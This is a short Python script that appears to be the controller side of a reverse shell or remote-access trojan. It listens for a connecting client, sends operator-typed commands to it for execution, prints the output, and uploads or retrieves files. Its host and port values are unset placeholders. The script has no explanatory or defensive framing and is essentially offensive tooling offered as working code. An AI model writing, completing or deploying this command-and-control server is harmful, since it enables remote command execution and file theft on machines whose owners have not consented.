import socket
import time
import base64
import os
import io


SERVER_HOST = HOST
SERVER_PORT = PORT

BUFFER_SIZE = 1048576

SEPARATOR = "<SEPARATOR>"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# just sending a message, for demonstration purposes
message = "Hello and Welcome".encode()
client_socket.send(message)

while True:
    
    # get the command from prompt
    command = input("Enter the command you wanna execute:")
    # send the command to the client
    client_socket.send(command.encode())
    
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Lost Connectino to Client: Disconnected by User")
        break
    # screenshot command
    elif command.lower().startswith("download"):
        print("downloading file")
    elif command.lower().startswith("upload"):
        filename = command[7:len(command)]
        print("sending file " + filename)
        filesize = os.path.getsize(filename)
        client_socket.send(f"sending file {filename}{SEPARATOR}{filesize}".encode())
        with open(filename, "rb") as f:
            bytes_read = f.read(BUFFER_SIZE)
            client_socket.sendall(bytes_read)
    # retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
    # When client sends file bytes
    if results.lower().startswith("sending file"): # wait for server to verify command recieved
        fileinformation = os.path.basename(results[13:len(results)])
        filename, filesize = fileinformation.split(SEPARATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)

        
        with open(filename, "wb") as f:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            f.write(bytes_read)

# close connection to the client
client_socket.close()
# close server connection
s.close()